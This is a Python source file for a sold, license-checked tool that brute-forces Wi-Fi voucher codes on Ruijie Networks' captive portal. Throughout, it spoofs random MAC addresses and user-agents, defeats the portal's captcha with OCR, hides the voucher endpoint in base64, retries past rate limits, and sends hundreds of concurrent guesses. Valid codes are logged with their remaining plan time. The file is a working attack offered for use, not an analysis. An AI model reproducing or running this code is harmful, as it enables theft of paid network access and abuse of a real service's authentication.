import asyncio, aiohttp, json, base64, random, re, os, string, time, argparse
import cv2
import ddddocr
import numpy as np

# License check
from license import verify_license

def check_license_before_start():
    valid, msg = verify_license()
    if not valid:
        print(f"\n❌ {msg}")
        print("\n💡 Please contact @Zawgyi1296 to get a valid license.")
        return False
    print(f"\n✅ {msg}")
    return True

# ─────────────────────────── Settings ───────────────────────────
CONCURRENCY  = 300
BATCH_SIZE   = 300
RESULT_FILE  = os.path.expanduser("~/scan_results.txt")
# ────────────────────────────────────────────────────────────────

_connector      = None
_voucher_sem    = None
_ocr            = ddddocr.DdddOcr(show_ad=False)
stop_flag       = False
found_codes     = []
limited_codes   = []
retry_total     = 0
scan_start_time = None

# ANSI escape codes for colors and styles
COLOR_RESET = "\033[0m"
BOLD        = "\033[1m"
DIM         = "\033[2m"
GREEN       = "\033[92m"
YELLOW      = "\033[93m"
RED         = "\033[91m"
BLUE        = "\033[94m"
CYAN        = "\033[96m"
MAGENTA     = "\033[95m"

# ═══════════════════════════ LOGO ════════════════════════════════

def show_logo():
    logo = f"""
{BOLD}{CYAN}
 ███████╗ █████╗ ██╗    ██╗    ██████╗ ██╗   ██╗██╗
 ╚══███╔╝██╔══██╗██║    ██║   ██╔════╝╚██╗ ██╔╝██║
   ███╔╝ ███████║██║ █╗ ██║   ██║      ╚════╝ ██║
  ███╔╝  ██╔══██║██║███╗██║   ██║       ██╗  ██║
 ███████╗██║  ██║╚███╔███╔╝   ╚██████╗  ╚═╝  ██║
 ╚══════╝╚═╝  ╚═╝ ╚══╝╚══╝    ╚═════╝         ╚═╝
{COLOR_RESET}
{BLUE}╔══════════════════════════════════════════════════════════════╗
║  {GREEN}ZAW GYI Ruijie Scanner v2.1 (9-Digit){BLUE}                    ║
║  {YELLOW}Admin : {MAGENTA}@Zawgyi1296{BLUE}                                   ║
║  {DIM}Created by {MAGENTA}ZAW GYI{BLUE}                                   ║
╚══════════════════════════════════════════════════════════════╝{COLOR_RESET}
"""
    print(logo)

# ═══════════════════════════ Interactive Menu ════════════════════

def interactive_menu():
    print(f"\n{BOLD}{GREEN}[═] ZAW GYI Ruijie Scanner {COLOR_RESET}")
    print(f"{BLUE}─────────────────────────────────────────{COLOR_RESET}")
    
    print(f"\n{BOLD}{YELLOW}[1]{COLOR_RESET} Mode Selection:")
    print(f"  {CYAN}6{COLOR_RESET}  - 6 digit (000000-999999)")
    print(f"  {CYAN}7{COLOR_RESET}  - 7 digit (0000000-9999999)")
    print(f"  {CYAN}8{COLOR_RESET}  - 8 digit (00000000-99999999)")
    print(f"  {CYAN}9{COLOR_RESET}  - 9 digit (000000000-999999999) ✅")
    print(f"  {CYAN}ascii-lower{COLOR_RESET}  - a-z (6 characters)")
    print(f"  {CYAN}all{COLOR_RESET}  - a-z + 0-9 (6 characters)")
    
    mode = input(f"\n{BOLD}{GREEN}➜{COLOR_RESET} Select Mode [default: 6]: ").strip() or "6"
    
    print(f"\n{BOLD}{YELLOW}[2]{COLOR_RESET} Speed Selection:")
    print(f"  {CYAN}300{COLOR_RESET}   - Default (Recommended for 9-digit)")
    print(f"  {CYAN}500{COLOR_RESET}   - Medium")
    print(f"  {CYAN}800{COLOR_RESET}   - Fast")
    print(f"  {CYAN}1000{COLOR_RESET}  - Very Fast (Risk)")
    
    speed_input = input(f"\n{BOLD}{GREEN}➜{COLOR_RESET} Select Speed [default: 300]: ").strip()
    speed = int(speed_input) if speed_input.isdigit() else 300
    
    print(f"\n{BOLD}{YELLOW}[3]{COLOR_RESET} URL Input:")
    url = input(f"\n{BOLD}{GREEN}➜{COLOR_RESET} Enter Session URL: ").strip()
    
    while not url:
        print(f"{RED}❌ URL cannot be empty!{COLOR_RESET}")
        url = input(f"\n{BOLD}{GREEN}➜{COLOR_RESET} Enter Session URL: ").strip()
    
    print(f"\n{BLUE}─────────────────────────────────────────{COLOR_RESET}")
    print(f"{BOLD}{GREEN}[✓]{COLOR_RESET} Mode: {CYAN}{mode}{COLOR_RESET}")
    print(f"{BOLD}{GREEN}[✓]{COLOR_RESET} Speed: {CYAN}{speed}{COLOR_RESET}")
    print(f"{BOLD}{GREEN}[✓]{COLOR_RESET} URL: {CYAN}{url[:50]}...{COLOR_RESET}")
    print(f"{BLUE}─────────────────────────────────────────{COLOR_RESET}")
    
    return mode, speed, url

# ═══════════════════════════ Code generators ════════════════════

def digit_generator(length):
    return "".join(random.choice(string.digits) for _ in range(length))

_alnum = string.ascii_lowercase + string.digits
_alpha = string.ascii_lowercase

def all_generator(length=6):
    return "".join(random.choice(_alnum) for _ in range(length))

def ascii_generator(length=6):
    return "".join(random.choice(_alpha) for _ in range(length))

def iter_codes(mode):
    if mode in ["6"]:
        length = int(mode)
        codes = [str(i).zfill(length) for i in range(10 ** length)]
        random.shuffle(codes)
        yield from codes
        return
    elif mode == "7":
        length = 7
        codes = [str(i).zfill(length) for i in range(10 ** length)]
        random.shuffle(codes)
        yield from codes
        return
    
    while True:
        if mode == "8":
            yield digit_generator(8)
        elif mode == "9":
            yield digit_generator(9)
        elif mode == "ascii-lower":
            yield ascii_generator(6)
        elif mode == "all":
            yield all_generator(6)
        else:
            raise ValueError(f"Unknown mode: {mode}")

# ═══════════════════════════ Network helpers ════════════════════

def get_mac():
    b = random.choice([0x02, 0x06, 0x0A, 0x0E])
    return ":".join(f"{x:02x}" for x in ([b] + [random.randint(0,255) for _ in range(5)]))

def replace_mac(url, new_mac):
    if 'mac=' in url:
        return re.sub(r'(?<=mac=)[^&]+', new_mac, url)
    return url

async def get_session_id(sess, session_url, previous=None):
    sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", session_url)
    if sid:
        return sid.group(1)
    
    url = replace_mac(session_url, get_mac())
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        'upgrade-insecure-requests': '1',
    }
    try:
        async with sess.get(url, headers=headers, allow_redirects=True, ssl=False) as r:
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(r.url))
            return sid.group(1) if sid else previous
    except:
        return previous

async def check_session_url(url):
    headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
    try:
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as s:
            async with s.get(url, allow_redirects=True, headers=headers) as r:
                return "sessionId" in str(r.url)
    except:
        return False

# ═══════════════════════════ Captcha (Improved) ════════════════

def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    gray = cv2.fastNlMeansDenoising(gray, h=10)
    th = cv2.adaptiveThreshold(gray, 255, cv2.ADAPTIVE_THRESH_GAUSSIAN_C, cv2.THRESH_BINARY, 11, 2)
    _, buf = cv2.imencode('.png', th)
    result = _ocr.classification(buf.tobytes()).upper()
    if result and len(result) >= 4:
        return result
    return None

async def Captcha_Text(img_bytes):
    return await asyncio.to_thread(_ocr_sync, img_bytes)

async def Captcha_Image(sess, session_id):
    h = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'image/*,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    async with sess.get(
        'https://portal-as.ruijienetworks.com/api/auth/captcha/image',
        params={'sessionId': session_id, '_t': str(time.time())},
        headers=h, ssl=False
    ) as r:
        return await r.read()

async def Varify_Captcha(sess, session_id, text):
    h = {
        'authority': 'portal-as.ruijienetworks.com',
        'content-type': 'application/json',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    async with sess.post(
        'https://portal-as.ruijienetworks.com/api/auth/captcha/verify',
        headers=h, json={'sessionId': session_id, 'authCode': text}, ssl=False
    ) as r:
        d = await r.json()
        return session_id if d.get("success") is True else None

# ═══════════════════════════ Balance info ═══════════════════════

async def Code_Expires_Date(session_id):
    h_macc2 = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, */*; q=0.01',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    h_auth = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json;',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    endpoints = [
        (f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}', h_auth),
        (f'https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{session_id}', h_macc2),
    ]

    for url, headers in endpoints:
        try:
            async with aiohttp.ClientSession(
                connector=_connector, connector_owner=False,
                cookie_jar=aiohttp.CookieJar(),
                timeout=aiohttp.ClientTimeout(total=15)
            ) as s:
                async with s.get(url, headers=headers, ssl=False) as r:
                    data = await r.json()
                    res  = data.get('result', {})
                    plan = res.get('profileName', 'Unknown')

                    remaining = res.get('remainingMinutes')
                    if remaining is not None:
                        remaining = int(remaining)
                        if remaining >= 0:
                            hh, mm = divmod(remaining, 60)
                            time_str = f"{hh}h {mm}m" if hh else f"{mm}m"
                        else:
                            time_str = f"Expired ({remaining} mins)"
                        return f"Plan: {plan} | Time: {time_str}"

                    total = res.get('totalMinutes')
                    if total is not None:
                        hh, mm = divmod(int(total), 60)
                        time_str = f"{hh}h {mm}m" if hh else f"{mm}m"
                        return f"Plan: {plan} | Time: {time_str}"
        except:
            continue

    return "Plan:Unknown | Time:Unknown"

# ═══════════════════════════ Save result ════════════════════════

def save_result(code, info, kind="SUCCESS"):
    with open(RESULT_FILE, "a", encoding="utf-8") as f:
        f.write(f"[{kind}] {code}  |  {info}\n")

# ═══════════════════════════ Voucher check ══════════════════════

_post_url = base64.b64decode(
    b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
).decode()

async def perform_check(session_url, code):
    global retry_total

    for attempt in range(3):
        async with aiohttp.ClientSession(
            connector=_connector, connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=aiohttp.ClientTimeout(total=30)
        ) as sess:
            session_id = await get_session_id(sess, session_url)
            if not session_id:
                return

            auth_code = None
            for _ in range(8):
                try:
                    img      = await Captcha_Image(sess, session_id)
                    text     = await Captcha_Text(img)
                    if not text:
                        continue
                    verified = await Varify_Captcha(sess, session_id, text)
                    if verified:
                        auth_code = text
                        break
                except:
                    pass

            if not auth_code or stop_flag:
                return

            payload = {
                "accessCode": code,
                "sessionId":  session_id,
                "apiVersion": 1,
                "authCode":   auth_code,
            }
            headers = {
                "authority":       "portal-as.ruijienetworks.com",
                "accept":          "*/*",
                "content-type":    "application/json",
                "origin":          "https://portal-as.ruijienetworks.com",
                "user-agent":      "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 "
                                   "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            }
            try:
                async with sess.post(_post_url, json=payload, headers=headers, ssl=False) as r:
                    try:
                        data = await r.json()
                    except json.JSONDecodeError:
                        data = {"raw": await r.text()}
                    response = data
            except Exception:
                continue

        if isinstance(response, dict) and 'raw' in response:
            raw_str = response['raw']
            if 'request limited' in raw_str.lower():
                retry_total += 1
                await asyncio.sleep(0.5)
                continue
        else:
            if isinstance(response, dict) and response.get('message') and 'limited' in response.get('message', '').lower():
                retry_total += 1
                await asyncio.sleep(0.5)
                continue
        
        if isinstance(response, dict) and ('logonUrl' in response or response.get('code') == 0 or response.get('success') is True):
            info = await Code_Expires_Date(session_id)
            found_codes.append(f"{code} | {info}")
            save_result(code, info, "SUCCESS CODE")
            print(f"\n{GREEN}[+] SUCCESS CODE: {code} | {info}{COLOR_RESET}")
            return
        
        if isinstance(response, dict):
            error_code = response.get('errorCode') or response.get('code')
            if error_code == 'STA' or 'STA' in str(response):
                info = await Code_Expires_Date(session_id)
                limited_codes.append(f"{code} | {info}")
                save_result(code, info, "LIMITED CODE")
                print(f"\n{YELLOW}[!] LIMITED CODE: {code} | {info}{COLOR_RESET}")
                return
        
        break
    else:
        return

# ═══════════════════════════ Runner ═════════════════════════════

async def run_bruteforce(mode, session_url, speed):
    global _voucher_sem, stop_flag, scan_start_time, _connector, CONCURRENCY

    CONCURRENCY = speed

    _connector      = aiohttp.TCPConnector(limit=CONCURRENCY + 100, ssl=False)
    _voucher_sem    = asyncio.Semaphore(CONCURRENCY)
    stop_flag       = False
    scan_start_time = time.monotonic()

    code_iter = iter_codes(mode)
    total     = 10 ** int(mode) if mode in ["6", "7"] else None
    checked   = 0

    show_logo()

    print(f"\n{'='*55}")
    print(f"  {BOLD}{GREEN}ZAW GYI Ruijie Voucher Scanner{COLOR_RESET}")
    print(f"{'='*55}")
    print(f"  {BLUE}Mode{COLOR_RESET}        : {BOLD}{mode}{COLOR_RESET}")
    print(f"  {BLUE}Speed{COLOR_RESET}        : {BOLD}{CONCURRENCY}{COLOR_RESET}")
    print(f"  {BLUE}Results{COLOR_RESET}     : {BOLD}{RESULT_FILE}{COLOR_RESET}")
    print(f"  {BLUE}Stop{COLOR_RESET}        : {BOLD}Ctrl+C{COLOR_RESET}")
    print(f"{'='*55}\n")

    try:
        while not stop_flag:
            batch = []
            for _ in range(BATCH_SIZE):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break

            async def _check(c):
                async with _voucher_sem:
                    return await perform_check(session_url, c)

            await asyncio.gather(*[_check(c) for c in batch], return_exceptions=True)
            checked += len(batch)

            elapsed = time.monotonic() - scan_start_time
            speed_display   = (checked / elapsed * 60) if elapsed > 0 else 0

            if total:
                pct = (checked / total) * 100
                print(f"\r{CYAN}🔍 Checked:{COLOR_RESET}{BOLD}{checked:,}{COLOR_RESET}/{DIM}{total:,}{COLOR_RESET} ({YELLOW}{pct:.1f}%{COLOR_RESET})  {BLUE}⚡{speed_display:,.0f} codes/min{COLOR_RESET}  {GREEN}✅{len(found_codes)}{COLOR_RESET}  {YELLOW}⚠️{len(limited_codes)}{COLOR_RESET}  {RED}🔁{retry_total}{COLOR_RESET}", end="", flush=True)
            else:
                print(f"\r{CYAN}🔍 Checked:{COLOR_RESET}{BOLD}{checked:,}{COLOR_RESET}  {BLUE}⚡{speed_display:,.0f} codes/min{COLOR_RESET}  {GREEN}✅{len(found_codes)}{COLOR_RESET}  {YELLOW}⚠️{len(limited_codes)}{COLOR_RESET}  {RED}🔁{retry_total}{COLOR_RESET}", end="", flush=True)

    except (asyncio.CancelledError, KeyboardInterrupt):
        stop_flag = True
    finally:
        await _connector.close()

    elapsed = time.monotonic() - scan_start_time
    hh, rem = divmod(int(elapsed), 3600)
    mm, ss  = divmod(rem, 60)

    print(f"\n\n{'='*55}")
    print(f"  {BOLD}{GREEN}Scan Complete{COLOR_RESET}")
    print(f"  {BLUE}Time Elapsed{COLOR_RESET} : {BOLD}{hh}h {mm}m {ss}s{COLOR_RESET}")
    print(f"  {BLUE}Checked{COLOR_RESET}      : {BOLD}{checked:,}{COLOR_RESET}")
    print(f"  {BLUE}Found{COLOR_RESET}        : {BOLD}{GREEN}{len(found_codes)}{COLOR_RESET}")
    print(f"  {BLUE}Limited{COLOR_RESET}      : {BOLD}{YELLOW}{len(limited_codes)}{COLOR_RESET}")
    print(f"  {BLUE}Retries{COLOR_RESET}      : {BOLD}{RED}{retry_total}{COLOR_RESET}")
    print(f"  {BLUE}Results File{COLOR_RESET} : {BOLD}{RESULT_FILE}{COLOR_RESET}")
    print(f"{'='*55}")

    if found_codes:
        print(f"\n{GREEN}✅ SUCCESS CODES:{COLOR_RESET}")
        for c in found_codes:
            print(f"   {GREEN}{c}{COLOR_RESET}")
    if limited_codes:
        print(f"\n{YELLOW}⚠️  LIMITED CODES:{COLOR_RESET}")
        for c in limited_codes:
            print(f"   {YELLOW}{c}{COLOR_RESET}")

# ═══════════════════════════ CLI entry ══════════════════════════

async def async_main():
    show_logo()
    
    # License စစ်ဆေးပါ
    if not check_license_before_start():
        return
    
    mode, speed, url = interactive_menu()
    
    print(f"\n{BOLD}{BLUE}[*]{COLOR_RESET} {BLUE}Session URL စစ်ဆေးနေသည်...{COLOR_RESET}")
    if not await check_session_url(url):
        print(f"{BOLD}{RED}❌ Session URL မမှန်ကန်ပါ — sessionId မတွေ့ပါ။{COLOR_RESET}")
        return
    print(f"{BOLD}{GREEN}✅ Session URL မှန်ကန်သည်။{COLOR_RESET}")

    await run_bruteforce(mode, url, speed)

if __name__ == "__main__":
    try:
        asyncio.run(async_main())
    except KeyboardInterrupt:
        print(f"\n{BOLD}{RED}[!]{COLOR_RESET} {RED}Stopped by user.{COLOR_RESET}")